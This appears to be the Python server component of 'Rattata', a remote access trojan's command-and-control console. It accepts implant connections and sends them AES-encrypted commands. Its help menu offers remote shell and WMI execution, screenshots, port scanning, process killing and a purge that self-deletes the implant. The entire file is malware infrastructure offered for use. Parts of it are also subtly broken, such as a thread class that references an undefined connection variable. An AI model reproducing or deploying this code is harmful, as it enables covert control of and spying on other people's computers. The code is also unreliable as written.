import socket, sys, hashlib, base64, os, threading
from Crypto import Random
from Crypto.Cipher import AES

# This is the key for the AES encryption, can be modified
CIPHER = ("32_rFE2Z@M4KSJYy6w2KgzH9fCYfD=&bPj?e")

# Create list to hold threads
threads = []

# Implement AES encryption
class AESCipher(object):
    def __init__(self, key):
        self.bs = 16
        self.key = hashlib.sha256(AESCipher.str_to_bytes(key)).digest()

    @staticmethod
    def str_to_bytes(data):
        u_type = type(b''.decode('utf8'))
        if isinstance(data, u_type):
            return data.encode('utf8')
        return data

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * AESCipher.str_to_bytes(chr(self.bs - len(s) % self.bs))

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]

    def encrypt(self, raw):
        raw = self._pad(AESCipher.str_to_bytes(raw))
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw)).decode('utf-8')

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

cipher = AESCipher(key=CIPHER)

# Create help menu for implant
def helpMenu(command):
  help = """
[*] For command specific help, Use: help <command>

  back		- Return to main menu
  cd		- Change current directory
  cp		- Copy file to new location (specify with full UNC paths)
  getpid	- Get current process ID
  getuid	- Get current username
  help		- Display help menu
  hostname	- Get system hostname
  kill		- Kill specified process ID
  ls		- List directory files
  ps		- Get process list
  portscan	- Perform TCP portscan against target system
  purge		- Exit session and self delete implant from system
  pwd		- Get present working directory
  screenshot	- Take screenshot of current user's Desktop
  shell		- Execute command
  sysinfo	- Recieve system information
  wmi		- Execute specified command via WMI
"""
  if command == '':
    print(help)
  elif command == 'help' or command == '?':
    print(help)
  elif 'help ' in command or '? ' in command:
    params = command.split()
    if params[1] == 'back':
      print('\n  Usage: back')
      print('  Returns to main menu\n')
    elif params[1] == 'cd':
      print('\n  Usage: cd <full path to directory>')
      print('  Change current directory\n')
    elif params[1] == 'cp':
      print('\n  Usage: cp <full path to file> <full path to new location> (MUST USE FULL UNC PATH!)')
      print('  Copy file to new location\n')
    elif params[1] == 'getpid':
      print('\n  Usage: getpid')
      print('  Get current process ID\n')
    elif params[1] == 'getuid':
      print('\n  Usage: getuid')
      print('  Get current username\n')
    elif params[1] == 'hostname':
      print('\n  Usage: hostname')
      print('  Get system hostname\n')
    elif params[1] == 'kill':
      print('\n  Usage: kill <process ID>')
      print('  Kill specified process ID\n')
    elif params[1] == 'ls':
      print('\n  Usage: ls')
      print('  List directory files\n')
    elif params[1] == 'ps':
      print('\n  Usage: ps')
      print('  Get process list\n')
    elif params[1] == 'portscan':
      print('\n  Usage: portscan <ip address>')
      print('  Perform portscan against target system (ports can be specified in implant pre-build)\n')
    elif params[1] == 'purge':
      print('\n  Usage: purge')
      print("  Exit session and self delete implant from system\n")
    elif params[1] == 'pwd':
      print('\n  Usage: pwd')
      print('  Get present working directory\n')
    elif params[1] == 'screenshot':
      print('\n  Usage: screenshot <path to save screenshot as .bmp file>')
      print("  Take screenshot of current user's Desktop\n")
    elif params[1] == 'shell':
      print('\n  Usage: shell <command to run>')
      print("  Execute command, to use cmd.exe specify 'shell cmd.exe /Q /c <command>\n")
    elif params[1] == 'sysinfo':
      print('\n  Usage: sysinfo')
      print("  Recieve system information\n")
    elif params[1] == 'wmi':
      print('\n  Usage: wmi <command to run>')
      print("  Execute specified command via WMI\n")
    else:
      pass
  else:
    pass

# Create help menu for main menu
def mainMenu():
  help = """
checkconns	- Check for new implant connections
list 		- List all established implant sessions available
interact <id>   - Allow you to select which implant session to interact with
quit or exit	- Exit Rattata
"""
  print(help)

# Create startup banner
def banner():
  print("""
#############################################
#      ____        __  __        __         #
#     / __ \____ _/ /_/ /_____ _/ /_____ _  #
#    / /_/ / __ `/ __/ __/ __ `/ __/ __ `/  #
#   / _, _/ /_/ / /_/ /_/ /_/ / /_/ /_/ /   #
#  /_/ |_|\__,_/\__/\__/\__,_/\__/\__,_/    #
#					    #
#             By: @airzero24                #
#                                           #
#############################################
""")
# Create threads for each implant
class implantThread(threading.Thread):
  def __init__(self,connections,details):
    threading.Thread.__init__(self)
    self.connection = connection
    self.details = details  

# Create interaction with a implant session
def interactImplant(command):
  if threads != []:
    implantSelect = command.split(" ")[1]
    implantSelect = int(implantSelect) -1
    implant = threads[implantSelect]
    implant = implant.details[0] 
    while True:
      command = raw_input(implant + ":rattata>")
      if command == '':
        helpMenu(command)
      elif command == 'help' or command == '?':
        helpMenu(command)
      elif 'help ' in command or '? ' in command:
        helpMenu(command)
      elif command == 'quit' or command == 'exit' or command == 'back':
        break
      elif command == 'purge':
        encrypted = cipher.encrypt(command)
        connection.send(encrypted)
        print("[+] Sent command '" + str(command) + "' to implant!\n")
        print("[!] Session has been closed and implant has been purged from system.\n")
        break
      else:
        encrypted = cipher.encrypt(command)
        connection.send(encrypted)
        print("[+] Sent command '" + str(command) + "' to implant!")
        result = connection.recv(16384)
        decrypted = cipher.decrypt(result)
        print("[+] Result from implant:\n" + str(decrypted))

# Define main function
if __name__ == '__main__':
  if os.geteuid() != 0:
    print("\n[!] Rattata needs to be run as root (web socket binding, etc.)... \n")
    sys.exit()
  banner()
  if (len(sys.argv) != 3):
    print("\n[*] This is the server component of Rattata.")
    print("[*] Usage: python server.py <Bind Address> <Bind port>\n")
    sys.exit()
  else:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.bind((sys.argv[1],int(sys.argv[2])))
      s.listen(99)
      print("[*] Waiting for connection...\n")
      while True:
        (connection, details) = s.accept()
        print("[+] Connection recieved from " + details[0] + ":" + str(details[1]) + "\n")
        newThread =  implantThread(connection, details)
        threads.append(newThread)
        while True:
          command = raw_input("rattata>")
          if command == 'help' or command == '?':
            mainMenu()
          elif command == 'list':
            print("[*] Available implant connections\n")
            if threads == []:
              print("[!] No available implants sessions.\n")
            else:
              counter = 0
              print("[*] Format: <session_id> <ipaddress:port>\n")
              for thread in threads:
                counter = counter + 1
                print(" " + str(counter) + " " + str(thread.details[0]) + ":" + str(thread.details[1])  +" (Established)")
              print("\n")
          elif command == 'interact':
            print("[!] Usage: interact <session_id>\n")
          elif command == 'quit' or command == 'exit':
            print("[*] Exiting Ratatat...\n")
            os.system('kill $PPID')
          elif command == 'checkconns':
            (connection, details) = s.accept()
            print("[+] Connection recieved from " + details[0] + ":" + str(details[1]) + "\n")
            newThread =  implantThread(connection, details)
            threads.append(newThread)
          elif 'interact ' in command:
            interactImplant(command)
          else:
            pass

    # Kill process on keyboard interrupt
    except KeyboardInterrupt:
      s.close()
      sys.exit(0)
